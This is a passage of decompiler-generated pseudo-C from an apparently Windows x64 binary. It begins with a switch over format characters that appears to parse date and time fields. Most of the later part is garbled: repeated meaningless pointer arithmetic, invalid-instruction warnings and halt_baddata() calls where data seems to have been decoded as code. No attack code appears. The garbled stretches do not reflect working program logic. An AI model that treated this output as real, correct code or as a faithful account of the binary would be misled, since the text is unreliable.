unaff_RSI = *(ppuVar76 + 0xb8);\n                *(ppuVar76 + 0xc0) = ppiVar59;\n                *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n                *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n                if ((*(ppuVar76 + 0xd8) == 0) && (*(ppuVar76 + 0xdc) != 0)) {\n                    *(*(ppuVar76 + 0x290) + 1) = *(*(ppuVar76 + 0x290) + 1) | 1;\n                }\n            }\n            goto code_r0x000140039f81;\n        case 'M':\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppuVar76 + 0x80);\n            puVar63 = ppuVar76 + 0xb0;\n            in_XMM1_Da = *(ppuVar76 + 0xc0);\n            in_XMM1_Db = *(ppuVar76 + 0xc4);\n            in_XMM1_Dc = *(ppuVar76 + 200);\n            in_XMM1_Dd = *(ppuVar76 + 0xcc);\ncode_r0x00014003af10:\n            iVar58 = UNRECOVERED_JUMPTABLE._0_8_[2][10];\n            *(ppuVar76 + 0xa0) = in_XMM1_Da;\n            *(ppuVar76 + 0xa4) = in_XMM1_Db;\n            *(ppuVar76 + 0xa8) = in_XMM1_Dc;\n            *(ppuVar76 + 0xac) = in_XMM1_Dd;\n            break;\n        case 'R':\n            UNRECOVERED_JUMPTABLE._0_8_ = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x30) = 6;\n            ppiVar59 = ppuVar76 + 0x90;\n            puVar63 = ppuVar76 + 0xb0;\n            *(ppuVar76 + 0x28) = 0;\n            arg3 = *(ppuVar76 + 600);\n            in_stack_00000030 = ppuVar76 + 0xa0;\n            ppuVar32 = ppuVar76;\ncode_r0x00014003aff4:\n            ppuVar76 = ppuVar32;\n            *(ppuVar76 + 0x98) = UNRECOVERED_JUMPTABLE._0_8_;\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 1;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003b04a;\n            fcn.140038900(puVar63, arg3, in_stack_00000030, ppiVar59);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x280) + 0x18) = *(ppuVar76 + 0xdc);\n                **(ppuVar76 + 0x290) = **(ppuVar76 + 0x290) | 2;\n            }\n            goto code_r0x000140039f81;\n        case 'S':\n            puVar63 = ppuVar76 + 0xb0;\n            iVar58 = *(*(*(ppuVar76 + 0x80) + 0x10) + 0x10);\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            break;\n        case 'T':\n            *(ppuVar76 + 0x30) = 99;\n            *(ppuVar76 + 0x28) = 0;\n            *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n            *(ppuVar76 + 0x48) = ppuVar76 + 0xd8;\n            *(ppuVar76 + 0x38) = 2;\n            *(ppuVar76 + 0x40) = *(ppuVar76 + 0x270);\n            *(ppuVar76 + 0x20) = ppuVar76 + 0xdc;\n            *(ppuVar76 + 0x90) = unaff_RDI;\n            *(ppuVar76 + 0xa0) = *(ppuVar76 + 0xc0);\n            *(ppuVar76 + 0xa4) = *(ppuVar76 + 0xc4);\n            *(ppuVar76 + 0xa8) = *(ppuVar76 + 200);\n            *(ppuVar76 + 0xac) = *(ppuVar76 + 0xcc);\n            *(ppuVar76 + -8) = 0x14003b8b7;\n            fcn.140038900(ppuVar76 + 0xb0, *(ppuVar76 + 600), ppuVar76 + 0xa0, ppuVar76 + 0x90);\n            ppiVar59 = *(ppuVar76 + 0xb0);\n            unaff_RSI = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 0xc0) = ppiVar59;\n            *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n            *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n            if (*(ppuVar76 + 0xd8) == 0) {\n                *(*(ppuVar76 + 0x290) + 1) = *(*(ppuVar76 + 0x290) + 1) | 6;\n                bVar89 = *(ppuVar76 + 200) == -1;\n                if ((ppiVar59 != NULL) && (bVar89)) {\n                    if (ppiVar59[2] < ppiVar59[3]) {\n                        iVar45 = *ppiVar59[2];\n                    }\n                    else {\n                        pcVar2 = (*ppiVar59)[9];\n                        *(ppuVar76 + -8) = 0x14003bf8c;\n                        iVar45 = (*pcVar2)();\n                    }\n                    if (iVar45 == -1) {\n                        *(ppuVar76 + 0xc0) = 0;\n                    }\n                    bVar89 = iVar45 == -1;\n                }\n                uVar42 = uVar40;\n                uVar64 = uVar41;\n                if (uVar41 != 0) {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar45 = *unaff_RDI[2];\n                    }\n                    else {\n                        pcVar2 = (*unaff_RDI)[9];\n                        *(ppuVar76 + -8) = 0x14003bfb1;\n                        iVar45 = (*pcVar2)(unaff_RDI);\n                    }\n                    if (iVar45 == -1) {\n                        unaff_RDI = NULL;\n                        uVar64 = 0;\n                        uVar42 = uVar41;\n                    }\n                    else {\n                        uVar42 = 0;\n                    }\n                }\n                iVar83 = *(ppuVar76 + 0xdc);\n                if (bVar89 == uVar42) {\ncode_r0x00014003b930:\n                    if (iVar83 < 0x45) {\n                        iVar83 = iVar83 + 100;\n                    }\n                    ppiVar59 = *(ppuVar76 + 0xc0);\n                }\n                else {\n                    *(ppuVar76 + -8) = 0x14003bbe6;\n                    fcn.140029f90(ppuVar76 + 0xc0);\n                    pcVar2 = (*unaff_R12)[0xc];\n                    *(ppuVar76 + -8) = 0x14003bbf9;\n                    cVar39 = (*pcVar2)();\n                    if (9 < cVar39 - 0x30U) goto code_r0x00014003b930;\n                    piVar88 = *(ppuVar76 + 0xc0);\n                    iVar83 = (cVar39 - 0x30U) + iVar83 * 10;\n                    piVar66 = piVar88[3];\n                    if (piVar88[2] < piVar66) {\n                        piVar54 = piVar88[2] + 1;\n                        *(ppuVar76 + 0xdc) = iVar83;\n                        piVar88[2] = piVar54;\n                        *(ppuVar76 + 200) = 0xffff;\n                    }\n                    else {\n                        pcVar2 = *(*piVar88 + 0x50);\n                        *(ppuVar76 + -8) = 0x14003bde2;\n                        (*pcVar2)();\n                        *(ppuVar76 + 0xdc) = iVar83;\n                        piVar54 = piVar88[2];\n                        *(ppuVar76 + 200) = 0xffff;\n                        piVar66 = piVar88[3];\n                    }\n                    if (piVar54 < piVar66) {\n                        iVar45 = *piVar54;\n                    }\n                    else {\n                        pcVar2 = *(*piVar88 + 0x48);\n                        *(ppuVar76 + -8) = 0x14003bff1;\n                        iVar45 = (*pcVar2)();\n                    }\n                    if (iVar45 == -1) {\n                        *(ppuVar76 + 0xc0) = 0;\n                    }\n                    if (uVar64 != 0) {\n                        if (unaff_RDI[2] < unaff_RDI[3]) {\n                            iVar46 = *unaff_RDI[2];\n                        }\n                        else {\n                            pcVar2 = (*unaff_RDI)[9];\n                            *(ppuVar76 + -8) = 0x14003bfff;\n                            iVar46 = (*pcVar2)(unaff_RDI);\n                        }\n                        if (iVar46 == -1) {\n                            unaff_RDI = NULL;\n                            uVar40 = uVar64;\n                        }\n                        else {\n                            uVar40 = 0;\n                        }\n                    }\n                    if ((iVar45 == -1) == uVar40) {\n                        ppiVar59 = *(ppuVar76 + 0xc0);\n                    }\n                    else {\n                        *(ppuVar76 + -8) = 0x14003bd43;\n                        fcn.140029f90(ppuVar76 + 0xc0);\n                        pcVar2 = (*unaff_R12)[0xc];\n                        *(ppuVar76 + -8) = 0x14003bd56;\n                        cVar39 = (*pcVar2)();\n                        ppiVar59 = *(ppuVar76 + 0xc0);\n                        if (cVar39 - 0x30U < 10) {\n                            if (ppiVar59[2] < ppiVar59[3]) {\n                                ppiVar59[2] = ppiVar59[2] + 2;\n                            }\n                            else {\n                                pcVar2 = (*ppiVar59)[10];\n                                *(ppuVar76 + -8) = 0x14003bf9b;\n                                (*pcVar2)(ppiVar59);\n                                ppiVar59 = *(ppuVar76 + 0xc0);\n                            }\n                            *(ppuVar76 + 200) = 0xffff;\n                            *(ppuVar76 + 0xdc) = iVar83 * 10 + cVar39 + -0x30;\n                        }\n                    }\n                    iVar83 = *(ppuVar76 + 0xdc) + -0x76c;\n                    *(*(ppuVar76 + 0x290) + 1) = *(*(ppuVar76 + 0x290) + 1) & 0xfd;\n                }\n                *(*(ppuVar76 + 0x280) + 0x14) = iVar83;\n                unaff_RSI = *(ppuVar76 + 200);\n            }\n            goto code_r0x000140039f81;\n        }\n        *(ppuVar76 + 0x90) = unaff_RDI;\n        *(ppuVar76 + 0x38) = iVar58;\n        *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n        *(ppuVar76 + 0x40) = *(ppuVar76 + 0x290);\ncode_r0x00014003ab92:\n        *(ppuVar76 + 0x30) = *(ppuVar76 + 0x280);\n        *(ppuVar76 + 0x28) = ppuVar76 + 0xd8;\n        *(ppuVar76 + 0x20) = *(ppuVar76 + 0x270);\n        *(ppuVar76 + -8) = 0x14003abd6;\n        fcn.140039d50(puVar63, *(ppuVar76 + 600), ppuVar76 + 0xa0, ppuVar76 + 0x90);\n        ppiVar59 = *(ppuVar76 + 0xb0);\n        unaff_RSI = *(ppuVar76 + 0xb8);\n        *(ppuVar76 + 0xc0) = ppiVar59;\n        *(ppuVar76 + 200) = *(ppuVar76 + 0xb8);\n        *(ppuVar76 + 100) = *(ppuVar76 + 0xd8);\n        goto code_r0x000140039f81;\n    default:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x81:\n    case 0xa1:\n        UNRECOVERED_JUMPTABLE._0_8_ = (uVar50 & 0xffffff00 | uVar40 & 0xb2) + 0x4cffffe9;\n        puVar63 = in_stack_00000048;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003a40b;\n    case 0x82:\n    case 0xa2:\n    case 0xa8:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        bVar89 = 0xb7 < *0x14010b1d3;\n        *0x14010b1d3 = *0x14010b1d3 + 0x48;\n        puVar84 = ppiVar59 + 0x3b;\n        uVar42 = *puVar84;\n        uVar80 = in_stack_00000038;\n        uVar64 = *puVar84;\n        *puVar84 = uVar64 + uVar80 + bVar89;\n        *unaff_R15 = (*unaff_R15 - uVar80) - (CARRY1(uVar42, uVar80) || CARRY1(uVar64 + uVar80, bVar89));\n        *(arg3 + 1) = *(arg3 + 1);\n        *(unaff_RDI + 0x14010b1ff) = *(unaff_RDI + 0x14010b1ff) + uVar40;\n        *(unaff_RSI + 0x41) = *(unaff_RSI + 0x41) + uVar41;\n        ppiVar59 = unaff_R13;\n        goto code_r0x00014003a242;\n    case 0x83:\n        goto code_r0x00014003b2a8;\n    case 0x84:\n        goto code_r0x00014003aff4;\n    case 0x88:\n        goto code_r0x00014003b0df;\n    case 0x89:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003ac64;\n    case 0x8d:\n        pcVar53 = (UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar40 + *UNRECOVERED_JUMPTABLE._0_8_) - 0x77;\n        *pcVar53 = *pcVar53 + 'H';\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003ab92;\n    case 0x92:\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003ab4f;\n    case 0x93:\n        goto code_r0x00014003aa75;\n    case 0x94:\n        pcVar53 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar40 + *UNRECOVERED_JUMPTABLE._0_8_;\n        *pcVar53 = *pcVar53 + uVar40 + *UNRECOVERED_JUMPTABLE._0_8_;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003a9a2;\n    case 0x95:\n        ppiVar59 = (unaff_RBP & 0xffffffff) + -1;\n        *ppiVar59 = *ppiVar59 << 1 | *ppiVar59 >> 7;\n        return unaff_RBP & 0xffffffff;\n    case 0x97:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003a7ac;\n    case 0x98:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        goto code_r0x00014003b66c;\n    case 0x99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x9a:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003b3a4;\n    case 0xa3:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(iVar58 + 0x14010b1d1) = *(iVar58 + 0x14010b1d1) + 'H';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(iVar58 + 0x14010b1d5) = *(iVar58 + 0x14010b1d5) + 'H';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        arg1 = uVar64 + uVar42;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003b3a4;\n    case 0xa4:\n    case 0xa5:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + UNRECOVERED_JUMPTABLE._0_8_;\n        arg1 = uVar64 + uVar42;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003a40b;\n    case 0xaa:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003af10;\n    case 0xad:\n        *(iVar58 + 0x14010b1d1) = *(iVar58 + 0x14010b1d1) + 'H';\n        ppuVar76 = 0x9024;\n        *(iVar58 + 0x14010b1d1) = *(iVar58 + 0x14010b1d1) + 'H';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(iVar58 + 0x14010b1d3) = *(iVar58 + 0x14010b1d3) + 'H';\n        uVar55 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00 | uVar40 + *UNRECOVERED_JUMPTABLE._0_8_;\n        uVar40 = *unaff_RDI;\n        *unaff_RDI = *unaff_RDI + 'H';\n        *0x90c4 = *0x90c4 + 0x4010b248 + (0xb7 < uVar40);\n        goto code_r0x00014003b1e3;\n    case 0xae:\n    case 0xb4:\n        *(unaff_RBP + -0x77) = *(unaff_RBP + -0x77) + 'H';\n        pcVar2 = swi(0x89);\n        (*pcVar2)(uVar56);\n        ppuVar76 = auStack96;\n        puVar52 = in_stack_00000230;\n        ppiVar59 = unaff_R13;\n        goto code_r0x00014003a69f;\n    case 0xb0:\n        *(arg1 + 0xd82484) = *(arg1 + 0xd82484) + 'H';\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        ppuVar35 = &puStack104;\n    case 0xb2:\n        goto code_r0x00014003ad63;\n    case 0xb7:\n        goto code_r0x00014003ae2b;\n    case 0xb8:\n        UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff30;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + UNRECOVERED_JUMPTABLE._0_8_;\n        ppuVar76 = &puStack104;\n        goto code_r0x00014003ae03;\n    case 0xb9:\n        goto code_r0x00014003b698;\n    case 0xbb:\n    case 0xcb:\n    case 0xd9:\n    case 0xe7:\n    case 0xf3:\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xbc:\n    case 0xcc:\n    case 0xda:\n    case 0xe8:\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xbd:\n    case 0xcd:\n    case 0xdb:\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xbe:\n    case 0xce:\n    case 0xdc:\n    case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xbf:\n    case 0xcf:\n    case 0xdd:\n    case 0xeb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xc6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 200:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd7:\n        arg1 = arg1 + 0xd;\n        *arg1 = *arg1 & uVar42;\n        if (*arg1 != 0) {\n            *unaff_RSI = *unaff_RSI + 1;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        out(*unaff_RSI, arg3);\n        puVar84 = unaff_RDI + *(unaff_RSI + 0x6f) * 0x77 * 2 + 99;\n        *puVar84 = *puVar84 & 0xb2;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe5:\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(unaff_RDI + 0x11) = *(unaff_RDI + 0x11) ^ uVar64;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *unaff_RDI = 0;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        uVar72 = *UNRECOVERED_JUMPTABLE._0_8_;\n        cVar39 = *UNRECOVERED_JUMPTABLE._0_8_;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        if (!SCARRY1(cVar39, uVar40)) {\n            *(iVar58 + 0x14010b249) = *(iVar58 + 0x14010b249) + uVar50 + CARRY1(uVar72, uVar40);\n            *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n            *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n            *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n            *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n            *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n            uVar72 = *UNRECOVERED_JUMPTABLE._0_8_;\n            *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar42;\n            ppuVar78 = auStack96;\n            *(iVar58 + 0x14010b249) = *(iVar58 + 0x14010b249) + uVar50 + CARRY1(uVar72, uVar42);\n            *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n            *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        }\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 & uVar41;\n        *(iVar58 + 0x14010b249) = *(iVar58 + 0x14010b249) + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        uVar72 = *UNRECOVERED_JUMPTABLE._0_8_;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar42;\n        iVar85 = *ppuVar78;\n        *(iVar58 + 0x14010b249) = *(iVar58 + 0x14010b249) + uVar50 + CARRY1(uVar72, uVar42);\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        puVar84 = iVar58 + 0x14010b280;\n        uVar72 = *puVar84;\n        *puVar84 = *puVar84 + uVar40;\n        *(iVar58 + 0x14010b249) = *(iVar58 + 0x14010b249) + uVar50 + CARRY1(uVar72, uVar40);\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar41;\n        *0x14010b248 = *0x14010b248 & arg3;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *(iVar85 + 0x11) = *(iVar85 + 0x11) ^ uVar64;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 & uVar41;\n        *(iVar58 + 0x14010b249) = *(iVar58 + 0x14010b249) + uVar50;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        uVar41 = *UNRECOVERED_JUMPTABLE._0_8_;\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar42;\n        iVar85 = ppuVar78[1];\n        *(iVar58 + 0x14010b249) = *(iVar58 + 0x14010b249) + uVar50 + CARRY1(uVar41, uVar42);\n        *UNRECOVERED_JUMPTABLE._0_8_ = *UNRECOVERED_JUMPTABLE._0_8_ + uVar40;\n        uVar40 = uVar40 * '\\x02';\n        uVar55 = UNRECOVERED_JUMPTABLE._0_8_ & 0xffffffffffffff00;\n        piVar60 = uVar55 | uVar40;\n        iVar83 = piVar60;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 - 0x11;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *(iVar85 + 0x11) = *(iVar85 + 0x11) ^ uVar64;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *0x14010b248 = *0x14010b248 & 0xffffff00 | *0x14010b248 + uVar80;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(*0x14010b248, uVar80);\n        *piVar60 = *piVar60 + uVar40;\n        uVar80 = uVar55 >> 8;\n        *(piVar60 + 0x1401129) = *(piVar60 + 0x1401129) + uVar80;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        uVar41 = *piVar60;\n        *piVar60 = *piVar60 + uVar42;\n        iVar58 = ppuVar78[2];\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar41, uVar42);\n        *piVar60 = *piVar60 + uVar40;\n        puVar84 = piVar60 + 0x39;\n        uVar41 = *puVar84;\n        *puVar84 = *puVar84 + uVar40;\n        *(piVar60 + 1) = *(piVar60 + 1) + iVar83 + CARRY1(uVar41, uVar40);\n        *piVar60 = *piVar60 + uVar40;\n        uVar40 = uVar40 + uVar42;\n        piVar60 = uVar55 | uVar40;\n        uVar65 = arg3 - *0x14010b248;\n        puVar71 = uVar65;\n        iVar83 = piVar60;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + uVar40;\n        puVar84 = iVar58 + 0x11;\n        *puVar84 = *puVar84 ^ uVar64;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 + uVar40;\n        puVar71[0x14010b248] = puVar71[0x14010b248] + 0xb2;\n        *piVar60 = *piVar60 + iVar83;\n        *piVar60 = *piVar60 